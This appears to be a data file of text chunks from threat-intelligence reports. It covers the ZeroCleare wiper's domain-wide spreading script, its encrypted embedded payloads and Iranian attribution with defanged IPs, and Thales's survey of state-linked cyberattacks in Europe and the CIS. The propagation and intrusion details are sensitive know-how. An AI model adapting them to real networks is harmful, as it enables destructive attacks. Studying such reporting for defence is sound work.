systems."|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|f3f51e4d873a4eadbc2bf991248f7184

"The script is multifunctional and can act in a master or slave capacity depending on the parameters originally passed to it. Master and Slave Modes The ClientUpdate.ps1 PowerShell script has two main modes of operation: 1. $Master If it is running in $Master mode, the script identifies other domain controllers, then copies and executes the script on those machines in the $Master mode. It identifies all non-DC client/target systems and begins to copy and execute the ClientUpdate.exe wiper malware on them, with the other initiated domain controllers doing the same. 2. $MasterSlave In $MasterSlave mode, one domain controller will act as the Master and identify other domain controllers to copy and run the script on them in Agent/Slave mode. The work of copying and executing the malware on the client targets is then divided up by the master and assigned to the agents, who then report back to the master on their progress.

Once it has done this for all systems in $AllDC, the ClientUpdate.ps1 PowerShell script then retrieves a list of all non-DC systems using the PowerShell module Get-ADComputer. It filters out those already present on its DC list and stores them as variable $AllClient. Next, the script divides up the client list and assigns portions to each of the initialized domain controller agents. The agents work to copy and execute the ZeroCleare malware onto each of their assigned clients. There are also functions to keep track of agent workloads and the number of failed and successful clients. A client is determined to have failed if the agent cannot connect to it and create a shared folder on it. As redundancy, a swapping mechanism is in place to pass failed clients to another agent to try to infect them. These agents do not appear to check the status of the drive wiping malware itself.

Encrypted Data Reveals Additional Copies of Existing Files A redundancy mechanism of sorts, or maybe a way to resuscitate deleted malware files, the ClientUpdate.ps1 script contains a number of AES-encrypted and base64-encoded files stored within an array called $UpdateTempContents. We decrypted the contents of $UpdateTempContents using the identified key and found that these files all matched samples we encountered previously in this attack, namely. 1. GPOClientUpdateCore.ps1 2. ClientUpdateCore.ps1 3. x64\ClientUpdate.exe 4. x64\soy.exe 5. x86\ClientUpdate.exe 6. x86\elrawdsk.sys

Drilling into the first script, GPOClientUpdateCore.ps1, we inferred it was used for an UpdateDCGPO function within ClientUpdate.ps1 script. This function applies a group policy object (GPO) to the domain controllers 6. Within this function the script is copied to: ""C:\Windows\SYSVOL\sysvol\$Domain\Policies\{$Guid}\Machine\Scripts\Startup\ClientUp dateCore.ps1"""|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|282355e880d642baa3ff6b93183df840

The script GPOClientUpdateCore.ps1 itself performs the following: −

Creates folder C:\Windows\Temp\UpdateTemp\

−

Decrypts and extracts the encrypted contents of $UpdateTempContents to the newly created directory.

−

Checks if system is x86 or x64 and executes the corresponding version of ClientUpdate.exe.

The contents of this script are generated at runtime by the Generate-ClientController function of ClientUpdate.ps1. The generation function should result in the contents of $UpdateTempContents as found within ClientUpdate.ps1 that is copied to the next script, GPOClientUpdateCore.ps1. However, in the script we analyzed, this did not appear to work and $UpdateTempContents was empty. It could mean that the extraction and execution portions of this particular script sample failed.

Drilling into the second script, ClientUpdateCore.ps1, we inferred it was used by the Master and Agent systems to copy to and execute on target clients. This script does the following: −

Decrypts and extracts the encrypted contents of $UpdateTempContents to $SelfPath

−

If parameter $IMM (immediate) is set, then it runs Execute-Self function immediately.

−

Otherwise it sleeps for the defined number of seconds and then runs Execute-Self function.

−

The Execute-Self function first checks if a process called ClientUpdate is already running. If it is not, then it checks if x86 or x64 and then executes the appropriate version of ClientUpdate.exe.

In the specific sample provided of ClientUpdateCore.ps1, the generation script appears to have not worked correctly and $UpdateTempContents is empty, meaning that the extraction and execution parts of the function would have failed."|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|a7cca7bf73df4f08b5e7df6fb7e44312
"1.9. ZeroCleare: A Likely Collaboration Between Iranian State Sponsored Groups X-Force IRIS assesses that the ZeroCleare campaign included compromise and access by actors from the ITG13 group and at least one additional group, likely Iran-based threat actors. This assessment is based on ITG13's traditional mission, which has not included executing destructive cyber-attacks in the past, the gap in time between the initial access facilitated by ITG13, the last stage of the intrusion, as well as the different TTPs observed. Let’s look at the details of some of the resources used throughout the ZeroCleare attack and which can connect it with ITG13. For initial access, the IP address 193.111.152[. ]13, which was associated with ITG13 in recent Oilrig/APT34 leaks, and as also reported by Palo Alto, was used to scan target networks and access an account as early as the Fall of 2018. 7 A different Iranian threat actor likely accessed accounts from that address in mid-2019 preceding disk wiping operations. One of the IP addresses used to access compromised network accounts in mid-2019 was 194.187.249[. ]103, which is adjacent to another IP address, 194.187.249[.]102. That last IP address was used several months prior to the attack by the threat actor Hive0081 (aka xHunt). 8 While an interesting adjacency, X-Force IRIS does not have evidence Hive0081 was 7

involved in the ZeroCleare attack. Additionally, while recent reporting indicates that the Russian threat actor IRIS tracks as ITG12 (aka Turla) had access to ITG13 tools and infrastructure potentially during this time frame, X-Force IRIS does not believe ITG12 was behind the ZeroCleare attack. 9 During the destructive phase, the threat actor brute forced passwords to gain access to several network accounts, which were used to install the China Chopper and Tunna web shells after exploiting a SharePoint vulnerability. X-Force IRIS found an additional web shell named ""extension.aspx"", which shared similarities with the ITG13 tool known as TWOFACE/SEASHARPEE including the methods that were dynamically called from assembly, the use of AES encryption, as well as single letter variable names. The same threat actor also attempted to leverage legitimate remote access software, such as TeamViewer, and used an obfuscated version of Mimikatz to collect credentials from compromised servers. Regarding the ZeroCleare malware itself, while it shares some high-level similarities with Shamoon v3, specifically in how it used an EldoS RawDisk driver, X-Force IRIS assesses that ZeroCleare is dissimilar enough in its code and deployment mechanism to be considered distinct from the Shamoon malware family and treated as separate malware."|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|a3dbd0d360e547aaac0fd6b6c4e6f6e0
"While X-Force IRIS cannot attribute the activity observed during the destructive phase of the ZeroCleare campaign, we assess that high-level similarities with other Iranian threat actors, including the reliance on ASPX web shells and compromised VPN accounts, the link to ITG13 activity, and the attack aligning with Iranian objectives in the region, make it likely this attack was executed by one or more Iranian threat groups.

1.10. A New Destructive Wiper Threat in the Wild Various links inferred from examining common TTPs and indicators of compromise as mentioned in the previous section make it possible that this wiper variant was built by Iranbased nation state attackers. Recent activity from that sphere includes the “Sakabota” backdoor activity, recently reported by X-Force IRIS, also tied to ITG13 (aka “Oilrig” and “APT34”), as well as the Lyceum campaign reported by Dell-EMC SecureWorks. In these campaigns, the top targets were Kuwaiti shipping and transportation organizations.

1.11. Energy Sector in the Crosshairs Nation-state attackers have typically carried out destructive attacks against the energy sector, with historic focus especially oil and gas; however, destructive attacks can target any entity. Why has this sector been finding itself in the crosshairs of such activity? The key role oil and gas production and processing play on both the national and global level, represents a high-value target for state-sponsored adversarial actors. These types of attackers may be tasked with conducting anything from industrial espionage, to cyber kinetic attacks designed to disrupt the critical infrastructure of rival nations. Depending on the sophistication, scale, and frequency of attacks, cyber incidents in this space have the potential to disrupt critical services, damage or destroy highly specialized equipment, and ultimately inflict detrimental cascading effects upon global energy 10 security and industries downstream. 11, 12 While nation state attacks have been happening more in the past decade, it is since at least 2012 that Iranian state-sponsored threat actors have been leveraging cyber-attacks to inflict destructive, kinetic effects on their targets. 13 The use of cyber-based weapons in lieu of conventional military tactics presents Iran, in this case, with a low-cost, and potentially nonattributable means of conducting hostile, and even warlike activity."|data_input/Oilrig_reports/entry_9f7a8e01-6893-4617-8b0b-560ab605558c.text|402d7e497c6147d7bbe65c38b706cbcd
"With attribution to one specific group becoming a challenge nowadays, working under the cyber cloak of anonymity can also allow Iran to evade sanctions and preserve its relations with international players who may support its economic and nuclear energy interests. Looking at the geographical region hit by the ZeroCleare malware, it is not the first time the Middle East has seen destructive attacks target its energy sector. In addition to underpinning the economies of several Gulf nations, the Middle East petrochemical market, for example, hosts approximately 64.5% of the world’s proven oil reserves, making it a vital center of global energy architecture. 14 Destructive cyberattacks against energy infrastructure in this arena therefore represent a high-impact threat to both the regional and international markets.

1.12. Mitigating the Risk Posed by Destructive Malware When it comes to destructive attacks, the critical actions for security teams to take are early detection and escalation and coordinated response to contain and stop the spread. Here are some tips from our team that can help mitigate the risk of destructive malware.

1.12.1. Use and share threat intelligence to understand the risk to your organization Each threat actor has different motivations, capabilities, and intentions, and threat intelligence can help provide insights that increase the efficacy of an organization’s preparedness and eventual response to an incident. After the release of the ZeroCleare paper, our team received more information from other research teams which helped us calibrate certain IOCs in the paper. Sharing threat intelligence is a practice defenders must prioritize to better mitigate risk.

"1.12.3.

Deploy IAM, limit privileged users, and implement MFA

In most attacks, adversarial actors leverage privileged accounts to expand their foothold in compromised networks. Limit the number of those accounts to a minimum and back them up with multi-factor authentication (MFA). Also, don’t allow one account to access all systems. Deploy Identity and Access Management (IAM) to apply business-process centric policies to what your users can access. That way, if their account is compromised, the attacker will have a harder time using it for access to other parts of the network. Leveraging IAM can also help baseline legitimate access and alert security teams when lateral movement could be abusing access to compromised accounts.

Have backups, test backups, and keep offline backups

Backing up systems is a foundational best practice, but ensuring the organization has effective backups of critical systems and testing these backups is more important than ever. Being able to use backups in recovery can make a significant difference in remediating destructive malware attacks.

Test your response plans under pressure

Use of a well-tailored tabletop exercise and a cyber range simulation can help ensure that your teams are indeed ready, on both the tactical and strategic levels, to manage a destructive malware incident.

yber threats no longer have borders and we are now facing increasingly organized and international groups. The networks of attackers have professionalized and today target government organizations such as large companies or even the smallest ones. In recent years, recent health and geopolitical crises have further increased the tensions of the Cyber World and we now observe attacks targeting all sectors of activity whether for lucrative purpose as ransomware attacks, espionage or even, data theft. The first weapon in the face of this threat is to be able to understand our opponents, their techniques, tactics and procedures of attackers in order to ensure to protect the critical assets of our clients and government partners. As the European leader in cyber security and the worldwide leader in data protection, Thales addresses the entire information security lifecycle, the cornerstone of digital trust. Thales helps secure the digital trans-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|9caa1f4e529c4a0fabc1089de1d549d1
formation of the most demanding government bodies, private firms and critical infrastructure providers. Capitalising on our teams worldwide, with more than 11 consultancy teams and 6 Security Operation Centres, we can leverage our international threats expertise to ensure cyber protection to our customers from space to the ground and from information systems to operational technologies. Our Cyber Threat Intelligence expert team is screening on a daily basis a rich database and multiple cyber threat sources around the world, which we have been monitoring for several decades in order to ensure actionable strategies for critical companies or governments. It relies among other things, on collaboration and transparency between organizations to ensure the right sharing of information. Today, we want to provide as many expertise and solutions as possible for a cybersecurity that only makes sense if it is collective. It is with this objective that we wanted to broaden the scope of our Cyber Threat Atlas named “Cyber threat Hitmap” and provide it, for the first time, in a digital format opened to everyone. Our Thales Cyber Threat Atlas will open-source to everyone a detailed knowledge of the cyber threat ecosystem by contextualizing the activity of attacker groups. For this, we have selected a sample of 50 preliminary attac-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|881143b2a8a14ab8885697a638cc9e3e
"ker groups that we believe are particularly important in today’s cyber threat landscape. The knowledge of these attackers, their nature, their motivations, their tools and their operating methods served as a basis for the construction of this Atlas. This work, which comes from both geographical and sectoral angles, offers several complementary reading grids. Our analysis shows a breakdown into fourteen sectors of activity, allying the most traditional sectors (transportation, energy, education and research, telecommunications, health, government, legal, finance, manufacturing, retail) to innovative industries (automotive, space, maritime, aviation) which by the strategic nature of their activity are of interest to advanced threat actors. Thales uses directly this information to feed its Cybels offer of tools and services and provide high added value actions to ensure a better protection for everyone. Understanding the geostrategic frameworks as well as main targeted sectors threats is key to the relevance of Cyber detection and protection. Combined, they provide much better understanding state of the threat. I am sure that you will be able to make good use of this book for your detection and protection needs and I wish you a good read and regular browsing on http://cyberthreat.thalesgroup. com/ for live updates!

Contextual analysis of Europe and geocyber risks Europe today is an incredibly complex geopolitical space — the result of centuries of history marked by a constant oscillation between strife and union. It is composed of over 40 different countries and cultures with a great diversity of national and regional languages. Geographically, Europe comprises a highly developed Western Europe, which has long been open to globalisation and its Atlantic interface; a Sou-

thern Europe with a Mediterranean culture and outlook; an Eastern Europe observing Western Europe on one side and Russia on the other; and a Northern Europe around the Baltic. Modern Europe continues to reflect this history and geography. Despite these geostrategic and cultural differences, a European cooperation has been built around the European Union, the euro zone1 and bilateral

and/or multilateral agreements. The European continent is a privileged territory for the development of cyber threats: the size of the attack surface (governmental structures, enterprises) provides opportunities for cybercriminals, and different motivations can come into play, as Europe is both the cradle of companies willing to pay ransoms and a powerful symbol of the western world - justifying ideology-based attacks.

_TERRITORY AND IDENTITY: THE RISK OF CYBER DESTABILISATION"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|ecb957b34ccd4494bf0a7002f666be1a
"_TERRITORY AND IDENTITY: THE RISK OF CYBER DESTABILISATION

One of the greatest geocyber risks that Europe faces is destabilisation. The purpose of Europe as a combined entity is to be unified in order to ensure a shared development and a place on the international stage. This can lead to attempts to weaken it from abroad. One striking example is Brexit, which has marked a profound geopolitical reconfiguration in Europe. This shift has been exploited by threat actors to weaken political entities such as the European Union and the United Kingdom itself.

Fake Brexit-related document containing the Zebrocy malware were sent to multiple specific targets, enabling ATK5 to break into the computer networks of European government agencies. Most importantly, this attack displays the ability of attacker groups to leverage sensitive political issues and turn them into potential attack vectors. Zebrocy acted as a first-stage backdoor and was used to perform system reconnaissance, create or modify files, execute commands, take screenshots and create Windows scheduled tasks2.

FEARS: THE EXAMPLE OF

THE ATTACK ON TV5MONDE

In 2018, the ATK5 (APT28, Sofacy) group, known for its involvement on the 2016 U.S presidential election campaign and its allegedly close ties to Russian intelligence, conducted a phishing scheme targeting Western Europe and the United Kingdom in particular."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|191bfc9870e74c499769b62afbe267c5
"Some attacks also take advantage of internal crisis in certain countries to destabilise public opinion. On 8 April 2015, a hacker group took control of the TV5Monde website and its social media accounts and caused television programmes to be interrupted for several hours. We

12

now know that this attack was carried out by ATK5 (APT28), although it has not been directly attributed to the group. A hacker group calling itself the Cyber Caliphate, linked to so-called Islamic State, first claimed responsibility. To shed light on the attack and identify the real perpetrators, TV5Monde called in technical experts from ANSSI, France’s national agency for information system security, who restored service and conducted a forensic investigation to search for clues. As their investigation progressed, suspicions began to point to ATK5 (APT28). The evidence gathered by the experts looked similar to a modus operandi already used by the group. As reflected in this attack, it should be noted that groups such as ATK5 (APT28) use visceral issues of contention between or within European countries to destabilise and weaken them3. Interestingly enough, the main destabilising agent is not the attacks itself but rather its erroneous attribution to an entity

close to ISIS, creating an alliance of circumstance between an ideological opponent wishing to undermine European influence and a civilizational adversary who uses the claim to instil fear within the population."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|5516c4428493463f8ccb6f48f5bc7971
"_TERRITORY AND DEVELOPMENT: CYBERCRIME RISK AND INDUSTRIAL ESPIONAGE

Europe has many large corporations and SMEs (Small to medium-sized enterprises) that are interdependent at continental level. They are also part of the global economy. This European financial, industrial and innovation ecosystem inevitably attracts the attention of large cybercriminal groups as well as actors motivated by industrial espionage. _THE ERA OF CYBER-EXTORTION AND THE RISK OF GLOBAL SUPPLY CHAIN ATTACKS

_AIRBUS VICTIM OF INDUSTRIAL ESPIONAGE AND THE RISK OF GLOBAL ATTACKS VIA THE SUPPLY CHAIN"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|b3f6447bf92f4f20b63d1f1fd5ab9584
"_AIRBUS VICTIM OF INDUSTRIAL ESPIONAGE AND THE RISK OF GLOBAL ATTACKS VIA THE SUPPLY CHAIN

On 30 January 2020, French contractor Bouygues Construction was the victim of an attack claimed by the group of attackers behind the Maze ransomware4. The operators demanded a ransom of €10 million from the French group in exchange for a decryption key and the guarantee that its sensitive data would not be leaked. On 21 October 2020, Sopra Steria announced that it had fallen victim to the Ryuk ransomware5. A month later, in November 2020, Italy-based international energy group Enel announced that it had become the victim of the Netwalker ransomware and that its operators were demanding a payment of some €14 million6. Most European companies are closely integrated into the market economy and are therefore especially vulnerable to supply chain attacks. During the REvil ransomware attack on IT management software company Kaseya in July 2021, over 1,000 other organizations were impacted, mostly in Europe7. Swedish supermarket franchise Coop had to close 800 stores because they were unable to use their cash registers8. This supply chain attack culminated in a record ransom demand of $70 million in return for a universal decryption key."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f15908c5527c447383962525733acf6b
"Supply chain attacks on European industrial or financial groups are not only motivated by financial gain but also by technological catch-up. As a result, industrial espionage against major European corporations is now a significant threat. In 2019, Airbus was hit by a supply chain attack designed to steal information about the A350 airliner and the A400M military transport plane9. The attack was initially attributed to the Chinese hacker group ATK41 (APT10), then to the ATK146 group (Avivore)10. It should be noted that it is difficult to determine the exact origin of this attack, mainly because Chinese espionage groups tend to share their infrastructure and attack tools. This sophisticated attack demonstrated the strategic adaptability of certain groups and the advanced threat posed by supply chain attacks. For the attackers, the impossibility of a frontal attack on the Airbus group was circumvented by compromising suppliers of the aircraft manufacturer such as Rolls-Royce or Expleo, laying the ground for actors with basic capabilities to attack high value targets11.

"_TERRITORIES AND POLITICAL MODELS: RISK OF STRATEGIC INCIDENTS OF STRATEGIC INCIDENTS

Europe, as we explained earlier, is a geopolitical space with a diverse array of identities, territories, political orientations and societies, which can lead to conflicts. _AREAS OF INSTABILITY UKRAINE On the edge of Europe, in Ukraine, an armed conflict between Ukrainian government forces and Russian separatist militias has been ongoing since 2014. It is the result of the annexation of Crimea by Russia, which provoked an open war in eastern Ukraine. In 2014 and 2015, Germany, France, Ukraine and Russia ratified two different versions of the Minsk agreements to settle the conflict and end the fighting in the industrialized regions of Donetsk and Luhansk. These agreements were never implemented and the conflict was prolonged, taking the form of a trench war along the front line. The conflict has escalated in December 2021 with Russia moving troops near the border, making western governments fear a military attack of Ukraine12. Cyber Threat Handbook |

WESTERN BALKANS The Western Balkan is a region composed of several eastern European countries, namely Bosnia-Herzegovina, Croatia, Kosovo, Northern Macedonia, Montenegro, Serbia and Slovenia. In this region, where ethnic and religious tensions still exist between Kosovo and Serbia, and within Bosnia-Herzegovina itself, the European Union is trying to bring political stability through agreements pending eventual integration14. The issue remains complex because Russia also exerts an influence in the region, which can exacerbate geopolitical destabilisation and lead to cyberattacks.

_CYBERATTACKS AGAINST UKRAINE AMID TENSIONS WITH RUSSIA The ongoing armed conflict between the Ukrainian military and pro-Russian troops has sparked an intense cyber activity in the region, targeting especially the Ukrainian territory. The ATK14 hacker group (BlackEnergy) has long been known for targeting companies in Europe’s energy sector. Starting in early 2015, the group infiltrated a large number of Ukrainian electricity distribution companies in order to install the BlackEnergy malware and access their OT/SCADA infrastructure. On 23 December 2015, hackers successfully compromised the SCADA systems of three Ukrainian energy companies and shut down their substations. They used the KillDisk plugin to destroy files on workstations. The group also launched a more conventional DDoS attack on the call centres of the three companies to make them unavailable to customers. The attack left about 230,000 people without power for nearly six hours in the Ivano-Frankivsk, Chernivtsi and 14"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|808eae7dee874cfa87b44f15ff493edf
Kiev oblasts (regions). This attack is one of the first cases of cyber sabotage directed at a power grid and demonstrates the determination and skill of the attackers. It is still not known whether the malware caused the power outage, or simply allowed its operators to do it manually. On June 2017, a major cyberattack hit Ukrainian companies. The malware used is a new version of Petya, a family of ransomware uncovered in 2016, which had been infecting Windows-based systems. This attack dubbed NotPetya, initially targeting Ukrainian infrastructures spread globally and is still considered as one of the most destructive cyberattack ever achieved. The attackers leveraged the EternalBlue vulnerability and used unpatched computers to propagate across entire networks. The UK government, through its National Cyber Security Centre asserted with a high degree of confidence that the Russian military had carried out the NotPetya cyberattack, whose objective was to disrupt energy companies and government institutions in Ukraine13. The estimated cost for the global economy reaches 10 billion dollars.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|53a8d9ec129447d5b4f787ce223cbcee
On the night of January 13-14, 2022, a cyberattack named “Operation Bleeding Bear” affected several Ukrainian government sites, rendering the computer structure of state-owned sites temporarily inoperable. This low-complexity attack consisted of the defacement of the targeted sites with the replacement of the homepage with a propaganda message in Ukrainian. It seems that the attacker exploited a known vulnerability in a content management system (CMS). Besides, a dozen of systems (Windows and Linux) were also destroyed by a wiper malware. This attack comes in a context of escalating tensions due to the failure of negotiations and the massive presence of pro-Russian forces stationed at the border. If Ukraine points the finger at the group of hackers known as UNC1151, affiliated with the Belarusian secret service, the low level of technicality of the attacker opens up a wide range of possibilities in terms of its origin, from individual hackers to state-sponsored groups. This attack is indicative of the use of non-traditional fields including cyber in the pursuit of political objectives. In this case, the destabili-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f3e404ceb6484a47bcd7dbc4cf90169f
BALTIC STATES The Baltic states are a region where the homogenisation four dimensions — identity, society, politics and territory — is proving difficult. These countries, which declared independence in 1990 after the collapse of the Soviet Union, quickly sought to distance themselves from Russia’s sphere of influence by refusing to be integrated into the Commonwealth of Independent States (CIS) and instead joining the EU and NATO in 2004. Since the 2016 Warsaw Summit., they have benefited from NATO airspace and on the ground protection. While the region may seem well protected, it remains surrounded by Russian influence to the east and south (Kaliningrad enclave and Russian forces in Belarus) and lies in part alongside|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|ea12094bf55941c3b7b23de20f377825
Russia’s access route to the Baltic Sea. It should also be noted that there are significant Russian minorities in these countries (26.5% in Estonia, 26% in Latvia and 5.8% in Lithuania)15. _MASSIVE CYBERATTACKS IN ESTONIA In April 2007, dozens of Estonian organisations — Parliament, banks, government ministries, newspapers, etc. — were simultaneously targeted by a DDoS attack. In this large-scale campaign, one of the malwares used was none other than BlackEnergy from the ATK14 group (BlackEnergy). As a result of these significant and destructive attacks, NATO decided to set up its Cooperative Cyber Defence Centre of Excellence, which is based in Estonia. _A POWER SPACE AT RISK FROM STRATEGIC ESPIONAGE In addition to these attacks, which are exceptional in terms of their consequences, European countries are regularly under threat from strategic espionage campaigns by foreign groups. CONTINUOUS ESPIONAGE In November 2019, ANSSI, France’s national agency for information system security, reported cyberattacks against service providers and design offices. The hackers used the PlugX malware to infiltrate their systems, steal data and, almost certainly, access the networks of their clients. In July 2021, it was discovered that the Pegasus spyware was being used on a massive scale — a reminder of the strategic nature of certain|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d212e5ff531c491c9db3432f3d8f8aab
types of cyberattacks. More recently, in September 2021, the German authorities announced that German politicians had been spied on in the run-up to the federal elections by the Ghostwriter gang, an APT group known for its alleged close ties with Russian military service GRU. This is not the first time Germany has been at the center of an espionage-motivated attack campaign, as between 2017 and 2018 its government agencies were reportedly targeted by ATK56 (APT28), another group linked to Russia. During this incident, the hackers managed to gain access to the network of several German ministries (foreign affairs, defence) as well as the German’s Chancellery and the Federal Court of Auditors. German interests are also closely scrutinized by other countries, most notably Iran and China. The activity of Iranian attack groups on German targets has intensified recently with the rise of tensions in the Gulf and the maintenance of financial sanctions. A report by the Dutch intelligence services even pointed to the Iranian strategy of using cyber espionage as a tool in the quest to acquire European military technology. This strategy even extends to the political domain with the surveillance of its expatriate population in the Netherlands and the monitoring of the criticism addressed to the Iranian regime16.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7ad91be4482c464dbdd450cf4b8d8181
"Conclusion As we have seen, Europe is a complex geopolitical space where multiple spheres of power and various models are at play, chief among them the European Union, NATO and Russia. These models sometimes clash, leading to crises that are conducive to the emergence of cyberthreats — as in Ukraine,

the Baltic countries and the Western Balkans. Europe is the product of permanent oscillation between unity and plurality of identities, with political aspirations that can provoke societal, economic, political and territorial crises, and that can be utilised as levers of destabilisation by cyberattacker groups.

Europe is also highly integrated into the globalisation process, with industrial and financial champions, but also thanks to a myriad of SMEs, which are permanent targets of organised cybercrime and even industrial espionage.

Contextual analysis of CIS and geocyber risks On 8 December 1991, just before the USSR officially collapsed, Russia, Ukraine and Belarus signed the Minsk Treaty. This treaty established the Commonwealth of Independent States (CIS), which was intended to guarantee a form of multilateral consistency between the former Soviet republics, despite the overall disintegration.

On 21 December, Armenia, Azerbaijan, Turkmenistan, Kazakhstan, Kyrgyzstan, Uzbekistan, Moldova and Tajikistan joined the CIS. Two years later, in 1993, Georgia joined the group. It should be noted that the Baltic States, former soviet socialist republics, never joined the CIS. This organisation, built on the historic foundations of the Eas-

tern Bloc, is made up of a set of complex, intertwined dynamics, a Soviet Union centred on Moscow and the influences of new powers in a multipolar world. This confrontation leads to the emergence of regional tensions that justify the use of cyber as a vector of influence.

"_CAUCASUS: A STRATEGIC

CROSSROADS

_SEPARATISM, NATIONALISM

AND JIHADISM IN GEORGIA

The Caucasus is a strategic zone in several respects. First, geographically, it serves as a buffer zone between two continents: Europe and Asia. North of the Greater Caucasus mountain range, on the Georgian and Azerbaijani borders, lies Russia, the former heart of the Soviet Union. To the south is Turkey, with its Sunni nationalist culture, and Iran, which has a Shiite Islamic culture. The three countries are geographically intertwined and bordered to the east by the Caspian Sea and the west by the Black Sea. This particular geography and topography makes the Caucasus a narrow corridor and a crossroads of cultures and identities. This crossroads is also strategic and lead certain nearby powers — such as the European Union (with NATO), Turkey, Iran and Russia — to assert their influence in the region

After the fall of the USSR, many internal conflicts broke out. In Georgia, a civil war (1991-1993) pitted the secessionist provinces of Abkhazia and South Ossetia against the central government in Tbilisi1. Geographically, the Caucasus extends into Russian territory, with the North Caucasus. It was in the North Caucasus that the First Chechen War erupted in 1994. This conflict — as in Abkhazia and South Ossetia — was the scene of confrontation between independence movements and a former Soviet republic, in this case Russia."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|9319c542000b4c7f9d23b4c35374714f
"by popular, peaceful demonstrations, these revolutions highlight the confrontation between Western influence and Russia’s desire to control its near abroad. The democratic aspirations of the people and the spectre of the emergence of pro-Western civil societies in the region motivate Russian interference, particularly through disinformation campaigns as a part of a more global hybrid warfare strategy.

18

The regional consequences of the Russo-Chechen conflicts are significant and make terrorism even more entrenched. For example, the Pankisi Gorge crisis from 2002 to 2003 saw Georgia clash with Chechen rebels and members of Al-Qaeda. The 2000’s were also marked by the appearance of colour revolutions in former Soviet republics, in Georgia in 2003 (Rose Revolution), in Ukraine in 2004 (Orange Revolution) and in Belarus in 2005 (Jeans Revolution). Characterized"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|a6c1acafdf6f488cb83e137fa25ce6ca
In 2008, a war broke out between Georgia and South Ossetia, supported by Russia, Abkhazia and the CIS armed forces. This conflict, which Georgia lost, allowed to leave the CIS. This conflict signals the resurgence of Moscow’s influence, which is posing as the protector of secessions. In 2007 and 2008, around the time of the Russo-Georgian War and the widespread attacks in Estonia, the ATK5 group (APT28) really began to structure its attack campaigns. From 2007 to 2014, ATK5 (APT28) massively targeted Georgian government agencies, including the Ministry of the Interior and Ministry of Defence, as well as civilians. The ATK14 group (BlackEnergy) also launched massive DDoS attacks|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|b1431e2123704a48a22925dc6ac473e0
against Georgia and later began to target Estonia as well. The source code of the malware was sold at that time, which increased the number of attacks on Georgia. From 2011 to 2013, another ATK14 malware called Potao was used to target Armenia and Georgia. In late 2013, it began to be deployed in Ukraine, with several samples used to target this country. From September 2014, the victims of this malware included Ukrainian government agencies and the armed forces. In spring 2010, the ATK7 group (APT10) conducted actions across the entire Caucasus and Central Asia, with continued campaigns using PinchDuke against Turkey and Georgia as well as numerous campaigns against other members of the Commonwealth of Independent States, such as Kazakhstan, Kyrgyzstan, Azerbaijan and Uzbekistan. This same malware was identified in Chechnya in 2008. In 2015, ATK7 (APT29) also targeted Georgian entities with the CosmicDuke malware and a file attachment with a name in Georgian that translates “NATO consolidates control of Black Sea. docx”.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|50a42ecfe9a348ce80307666b9a74686
paign. Threat actors also conducted attacks against Armenian targets using Zero Days via Chrome and Internet Explorer. Azerbaijan was targeted by the ATK178 and ATK228 groups and the PoetRAT malware. The targets were highly specific and appeared to be mainly Azerbaijani public and private sector organisations, especially ICS (Import Control System) and SCADA (Supervisory Control and Data Acquisition) systems in the energy sector. The number and variety of tools they used indicate that the attacks were carefully planned. The ATK228 group’s main objective was to compromise the wind power companies that produce Azerbaijan’s electricity. On 5 August 2020, ATK5 (APT28) also launched an attack campaign using the Zebrocy malware against several NATO member governments, Middle Eastern governments and the Azerbaijan government, which cooperates with NATO. This attack campaign came just days after the clashes between Azerbaijan and Armenia and less than two months before the conflict began on 27 September.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|a84ed0036b624a55a09b4d3d1db7cb15
_CONFLICT BETWEEN ARMENIA AND AZERBAIJAN LINKED TO THE QUESTION OF NAGORNO-KARABAKH The path to the independence of Armenia from Azerbaijan was made in the throes of a war (1988-1994) between these two former Soviet republics. In 2020, a second war broke out between Nagorno-Karabakh, supported by Armenia, and Azerbaijan and the Syrian National Army, backed by Turkey. In November 2020, a ceasefire was jointly announced by the belligerents. Azerbaijan regained possession of the Agdam, Kalbajar and Lachin districts. Tensions are still extremely high in the region and animosity between Armenia and Azerbaijan remains significant. The 2020 conflict in Nagorno-Karabakh was also the theatre of a lot of cyber activity. The ATK116 group (Inception, Cloud Atlas) was active in October and November 2020 with an espionage campaign based on use of an article entitled: “Armenia transfers YPG/PKK terrorists to occupied area to train militias against Azerbaijan”. Both sides were targeted in this cam-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|4ad66fe88fac456f862c55c4340862c7

